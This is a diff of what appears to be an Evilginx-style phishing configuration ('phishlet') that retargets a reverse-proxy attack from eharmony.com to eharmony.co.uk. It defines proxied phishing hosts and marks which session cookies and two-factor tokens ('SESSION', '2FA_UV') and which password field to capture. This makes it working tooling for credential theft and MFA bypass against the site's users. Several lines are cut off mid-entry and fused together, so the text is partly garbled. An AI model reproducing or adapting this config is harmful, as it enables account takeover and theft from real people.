@@ -1,18 +1,15 @@
 author: '@maliondev'
-min_ver: '2.3.0'
+min_ver: '3.3.0'
 proxy_hosts:
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'eharmony.com', session: true, is_landing: true, auto_filter: true}
-  - {phish_sub: 'tms', orig_sub: 'tms', domain: 'eharmony.com', session: false, is_landing: false, auto_filter: false}
-  # - {phish_sub: 'login', orig_sub: 'www', domain: 'eharmony.com', session: false, is_landing: false, auto_filter: false}
-
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'eharmony.co.uk', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'eharmony.co.uk', session: true, is_login: true, auto_filter: false}
+  - {phish_sub: 'tms', orig_sub: 'tms', domain: 'eharmony.co.uk', session: false, is_landing: false, auto_filter: false}  # - {phish_sub: 'login', orig_sub: 'www', domain: 'eharmony.com', session: false, is_landing: false, auto_filter: fal>
 sub_filters:
-  - {triggers_on: 'www.eharmony.com', orig_sub: 'www', domain: 'eharmony.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.eharmony.com', orig_sub: 'tms', domain: 'eharmony.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-
+  - {triggers_on: 'www.eharmony.co.uk', orig_sub: 'www', domain: 'eharmony.co.uk', search: '{hostname_regexp}', replace>  - {triggers_on: 'www.eharmony.co.uk', orig_sub: 'tms', domain: 'eharmony.co.uk', search: '{hostname_regexp}', replace>
 auth_tokens:
-  - domain: '.eharmony.com'
+  - domain: '.eharmony.co.uk'
     keys: ['2FA_UV']
-  - domain: 'www.eharmony.com'
+  - domain: 'www.eharmony.co.uk'
     keys: ['SESSION', 'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef']
 
 credentials:
@@ -23,8 +20,8 @@ credentials:
   password:
     key: 'j_password'
     search: '(.*)'
-    type: 'post'
 
 login:
-  domain: 'www.eharmony.com'
-  path: '/profile'
+  domain: 'www.eharmony.co.uk'
+  path: '/login'
+    
